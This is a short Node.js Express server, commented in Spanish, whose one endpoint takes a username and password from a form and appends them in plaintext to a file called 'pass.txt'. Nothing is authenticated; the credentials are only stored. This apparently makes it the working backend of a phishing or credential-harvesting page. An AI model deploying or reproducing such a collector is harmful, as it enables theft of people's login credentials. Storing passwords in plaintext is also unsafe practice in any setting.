const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
require('dotenv').config();

// Crear la aplicación Express
const app = express();
const port = process.env.PORT || 10000; // Asegúrate de que el puerto esté configurado correctamente

// Middleware para parsear el cuerpo de las solicitudes como JSON
app.use(bodyParser.json());

// Ruta para recibir los datos del formulario
app.post('/saveData', (req, res) => {
    const { username, password } = req.body;

    // Asegúrate de que los datos no estén vacíos
    if (!username || !password) {
        return res.status(400).json({ message: 'Faltan datos' });
    }

    // Crear el texto que se va a guardar en el archivo
    const data = `Username: ${username}, Password: ${password}\n`;

    // Escribir los datos en el archivo 'pass.txt'
    fs.appendFile('pass.txt', data, (err) => {
        if (err) {
            console.error('Error al guardar los datos:', err);
            return res.status(500).json({ message: 'Error al guardar los datos' });
        }
        console.log('Datos guardados correctamente');
        res.json({ message: 'Datos guardados correctamente' });
    });
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor corriendo en http://localhost:${port}`);
});


